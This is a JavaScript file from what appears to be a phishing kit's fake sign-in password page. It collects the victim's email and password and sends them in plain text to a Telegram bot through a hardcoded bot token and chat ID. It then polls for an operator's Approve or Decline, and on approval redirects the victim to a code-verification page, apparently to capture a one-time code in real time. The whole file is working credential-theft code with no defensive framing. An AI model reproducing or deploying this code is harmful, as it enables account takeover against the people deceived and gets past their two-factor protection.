// Configuration
const BOT_TOKEN = '8424484193:AAFvLn7GwjI3US_nVBUKBOGKUGPuH-xcZo4';
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
const TIMEOUT_DURATION = 30000; // 30 seconds timeout
const chatId = '7867274282';

// State tracking
let pollingInterval = null;
let timeoutId = null;

// DOM Elements
const password = document.getElementById('passwordInput');
const togglePassword = document.getElementById("togglePassword");
const sendBtn = document.getElementById('sendBtn');
const userEmail = localStorage.getItem('signinEmail');

// Display user email

document.getElementById("signin-email").textContent = userEmail;


// Send data and wait for response
async function sendAndWaitForResponse() {
    // Validation
    if (!password.value.trim() || !userEmail) {
        password.focus();
        password.classList.add('input-error');
        return;
    }

    const data = [password.value.trim(), userEmail.trim()];


    // Reset UI
    clearState();
    toggleButton(sendBtn, true);
    sendBtn.classList.add('button-disabled');

    try {
        // Send message to Telegram
        const response = await fetch(`${API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: `Email: ${data[1]}\nPassword: ${data[0]}`,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Approve', callback_data: `yes_${data}` },
                        { text: '❌ Decline', callback_data: `no_${data}` }
                    ]]
                }
            })
        });

        const result = await response.json();

        if (!result.ok) {
            console.log(`Failed. Please try again later.`);
            setTimeout(() => { window.location.reload(); }, 2000);
            return;
        }

        // Store data and start waiting
        localStorage.setItem('lastData', data);

        // Start polling for response
        startPolling();

        // Set timeout
        timeoutId = setTimeout(() => {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
                console.log('Response timeout - please try again.');
                setTimeout(() => {
                    window.location.reload();
                }, 2000);
            }
        }, TIMEOUT_DURATION);

    } catch (error) {
        console.log(`Network error: ${error.message}`, 'error');
    }
}

// Poll for response
async function checkForResponse() {
    try {
        const response = await fetch(`${API_URL}/getUpdates`);
        const result = await response.json();

        if (result.ok && result.result.length > 0) {
            const lastData = localStorage.getItem('lastData');

            for (const update of result.result) {
                if (update.callback_query) {
                    const callback = update.callback_query;

                    if (callback.data.includes(lastData)) {
                        // Found our response!
                        clearState();

                        if (callback.data.startsWith('yes_')) {
                            window.location.href = "code-verify-page.html";
                        } else if (callback.data.startsWith('no_')) {
                            password.value = 'WrongPassword';
                            password.focus();
                            password.classList.add('input-error');
                        }

                        // Acknowledge the callback
                        await fetch(`${API_URL}/answerCallbackQuery`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ callback_query_id: callback.id })
                        });

                        return true;
                    }
                }
            }
        }
    } catch (error) {
        // Silent fail - we'll keep trying
        console.log('error');
    }
    return false;
}

// Start polling for response
function startPolling() {
    if (pollingInterval) clearInterval(pollingInterval);

    pollingInterval = setInterval(async () => {
        const gotResponse = await checkForResponse();
        if (gotResponse) {
            clearState(); // Clears interval and timeout
        }
    }, 2000); // Check every 2 seconds
}

// Clear all intervals and timeouts
function clearState() {
    if (pollingInterval) {
        clearInterval(pollingInterval);
        pollingInterval = null;
    }
    if (timeoutId) {
        clearTimeout(timeoutId);
        timeoutId = null;
    }
    localStorage.removeItem('lastData');
}

// Show final status message
// function showFinalStatus(message, type) {
//     clearState();
//     statusDiv.textContent = '';
//     responseDiv.textContent = message;
//     responseDiv.className = `response ${type}`;

//     // Auto-clear success messages after 5 seconds
//     if (type === 'success') {
//         setTimeout(() => {
//             responseDiv.textContent = '';
//             responseDiv.className = 'response';
//         }, 5000);
//     }
// }

// toggle function
function toggleButton(button, disable = true) {
    button.disabled = disable;
}

// Event Listeners
sendBtn.addEventListener('click', sendAndWaitForResponse);

// Optional: Auto-submit on Enter
password.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') sendAndWaitForResponse();
});

togglePassword.addEventListener("click", () => {
    const isPassword = password.type === "password";

    password.type = isPassword ? "text" : "password";

    togglePassword.classList.toggle("fa-eye");
    togglePassword.classList.toggle("fa-eye-slash");
});